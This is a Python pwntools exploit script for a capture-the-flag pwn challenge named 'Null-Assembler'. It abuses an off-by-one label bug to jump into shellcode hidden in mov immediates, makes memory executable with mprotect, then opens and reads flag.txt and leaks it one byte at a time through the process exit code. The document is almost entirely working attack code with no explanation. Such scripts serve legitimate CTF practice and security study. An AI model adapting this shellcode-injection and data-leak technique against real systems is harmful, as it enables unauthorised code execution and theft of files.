#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'
context.log_level = 'info'

BINARY = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Medium/Null-Assembler/pwn_nullassembler/null'

REGS = {'eax': 'h0', 'ebx': 'h1', 'ecx': 'h2', 'edx': 'h3'}

def create_atom(inst):
    assert len(asm(inst)) <= 0x2
    return asm(inst) + b'\xeb\x01'

def mov_(reg, val):    return f'mov {REGS[reg]},{val}\n'.encode()
def cmp_(r0, r1):     return f'cmp {REGS[r0]},{REGS[r1]}\n'.encode()
def ret_():           return b'ret\n'
def label_(n):        return n.encode() + b':\n'
def jmp_(n):          return f'jmp {n}\n'.encode()
def str_(reg, off):   return f'str {REGS[reg]},{off}\n'.encode()

# First stage shellcode (executed at idx 0x100, inside mov immediates)
sc_stage1 = b''
sc_stage1 += create_atom('push edi; push edi')  # save rdi twice
sc_stage1 += create_atom('mov esi, ebx')         # rsi = 0x1000
sc_stage1 += create_atom('syscall')               # mprotect(data,0x1000,7)
sc_stage1 += create_atom('pop edi ; pop edi')     # restore rdi
sc_stage1 += create_atom('jmp edi')               # jump to data section

def make_stage2(idx):
    with context.local(arch='amd64', bits=64):
        return asm(f"""
    push rdi
    mov rbx, rdi
    xor ecx, ecx
    mov eax, 5
    int 0x80
    mov edi, eax
    pop rsi
    mov rdx, 0x100
    xor eax, eax
    syscall
    xor edi, edi
    mov dil, [rsi + {idx}]
    mov eax, 231
    syscall
    """)

def get_one_byte(idx):
    p = process(BINARY) if args.LOCAL else remote('127.0.0.1', 1337)

    sc_stage2 = make_stage2(idx)
    log.info(f"Stage2: {len(sc_stage2)} bytes")

    payload = b''

    # Fill to idx 255 (41mov*5 + 17cmp*2 = 239, +16 prologue = 255)
    payload += mov_('eax', 0) * 41
    payload += cmp_('eax', 'ebx') * 17

    # First stage: 5 atoms = 5 movs of 5 bytes each
    for i in range(0, len(sc_stage1), 4):
        payload += mov_('eax', u32(sc_stage1[i:i+4]))

    # Write stage2 shellcode to data section
    for i in range(0, len(sc_stage2), 4):
        chunk = sc_stage2[i:i+4].ljust(4, b'\x90')
        payload += mov_('eax', u32(chunk))
        payload += str_('eax', i)

    # Write flag filename at data section (offset 0)
    fname = b"./flag.txt\x00"
    for i in range(0, len(fname), 4):
        chunk = fname[i:i+4].ljust(4, b'\x00')
        payload += mov_('eax', u32(chunk))
        payload += str_('eax', i)

    # Setup regs for mprotect
    payload += mov_('eax', 10)
    payload += mov_('ebx', 0x1000)
    payload += mov_('edx', 7)

    # Off-by-one: 32-char label
    n = 'A' * 0x20
    payload += label_(n)
    payload += jmp_(n)
    payload += ret_()

    # Verify positions
    pos = 16 + 239 + 25
    pos += ((len(sc_stage2) + 3) // 4) * 9
    pos += ((len(fname) + 3) // 4) * 9
    pos += 15
    log.info(f"Label idx: 0x{pos:x}, off-by-one -> 0x{pos & 0xffffff00:x}, match=0x100: {(pos & 0xffffff00) == 0x100}")

    p.sendline(payload)
    try:
        p.recvall(timeout=3)
    except: pass
    ec = p.poll()
    p.close()
    if ec is None or ec == 0: return None
    return p8(ec & 0xff)

def main():
    for idx in range(5):
        b = get_one_byte(idx)
        if b: log.success(f"Byte {idx}: {b}")
        else:
            log.error(f"Byte {idx}: failed")
            break

if __name__ == '__main__':
    main()
